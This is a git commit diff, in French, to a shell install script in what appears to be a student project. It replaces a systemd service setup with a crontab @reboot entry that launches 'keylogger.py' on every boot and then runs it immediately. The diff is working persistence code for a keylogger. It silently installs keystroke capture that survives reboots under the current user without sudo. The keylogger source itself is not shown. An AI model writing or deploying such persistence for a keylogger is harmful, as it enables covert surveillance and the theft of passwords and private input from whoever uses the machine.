642f5b594413416173bb0adb8fd1dac3252c6931
Daoudi Oussama <oussama.daoudi@etu.umontpellier.fr>
2024-10-03 10:28:22 +0200

    ajout des tâches programmées dans le script avec CRON

--- install_and_run/install_and_run.sh
+++ install_and_run/install_and_run.sh
@@ -26,43 +26,18 @@ else
 fi
 
 # Variables
-SERVICE_NAME="monscript"
-PYTHON_SCRIPT_PATH="/chemin/vers/monscript.py"
-USERNAME=$(whoami)
+PYTHON_SCRIPT_PATH="keylogger.py"
 
 # Chemin vers l'interpréteur Python
 PYTHON_EXEC=$(which python3)
 
-# Créer le fichier de service systemd
-echo "Création du fichier de service systemd..."
+# Ajouter la tâche @reboot à la crontab de l'utilisateur courant
+echo "Ajout de la tâche cron pour lancer le script Python au démarrage..."
 
-sudo bash -c "cat > /etc/systemd/system/$SERVICE_NAME.service" <<EOL
-[Unit]
-Description=Script Python au démarrage
-After=network.target
+# Vérification pour éviter les doublons
+(crontab -l 2>/dev/null | grep -v "@reboot $PYTHON_EXEC $PYTHON_SCRIPT_PATH"; echo "@reboot $PYTHON_EXEC $PYTHON_SCRIPT_PATH") | crontab -
 
-[Service]
-ExecStart=$PYTHON_EXEC $PYTHON_SCRIPT_PATH
-Restart=always
-User=$USERNAME
-
-[Install]
-WantedBy=multi-user.target
-EOL
-
-# Redémarrer systemd pour prendre en compte le nouveau service
-echo "Recharge systemd pour activer le nouveau service..."
-sudo systemctl daemon-reload
-
-# Activer le service au démarrage
-echo "Activation du service pour qu'il démarre automatiquement..."
-sudo systemctl enable $SERVICE_NAME.service
-
-# Démarrer le service maintenant
-echo "Démarrage du service..."
-sudo systemctl start $SERVICE_NAME.service
-
-echo "Le script Python est maintenant configuré pour démarrer au démarrage via systemd."
+echo "La tâche cron a été ajoutée pour exécuter le script Python au démarrage."
 
 # Exécution du fichier Python
 echo "Exécution du fichier Python..."
